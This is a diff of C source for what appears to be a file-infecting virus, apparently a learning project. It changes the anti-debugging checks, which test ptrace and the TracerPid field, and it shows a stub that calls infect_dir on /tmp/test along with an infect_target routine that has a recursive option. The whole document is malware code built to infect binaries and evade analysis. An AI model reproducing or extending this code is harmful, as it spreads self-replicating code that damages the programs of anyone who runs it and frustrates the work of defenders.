@@ -27,8 +27,8 @@ void _start();
 #if CREATE_STUB
 
 int main(void) {
-	if (is_traced() || ptrace_traceme() == -1) {
-		exit(0);
+	if (is_traced() || sys_ptrace(0, 0, 0, 0) == -1) {
+		return (0);
 	}
 	size_t offset = (uintptr_t)&placeholders - (uintptr_t)&_start;
 	infect_dir("/tmp/test", (void*)&_start, placeholders.stub_len, offset, 0);
@@ -39,20 +39,6 @@ int main(void) {
 }
 
 #else
-
-static bool is_traced_libc(void) {
-	FILE *f = fopen("/proc/self/status", "r");
-	if (!f) return (false);
-	char line[256];
-	while (fgets(line, sizeof(line), f)) {
-		if (strncmp(line, "TracerPid:\t", 11) == 0) {
-			fclose(f);
-			return (line[11] != '0' || (line[12] >= '0' && line [12] <= '9'));
-		}
-	}
-	fclose(f);
-	return (false);
-}
 
 static void infect_target(const char *path, const unsigned char *stub,
 	size_t stub_len, size_t offset, bool recursive)
@@ -71,7 +57,7 @@ static void infect_target(const char *path, const unsigned char *stub,
 }
 
 int main(int argc, char **argv) {
-	if (is_traced_libc() || ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {
+	if (is_traced() || ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {
 		return (0);
 	}
 	bool recursive = false;
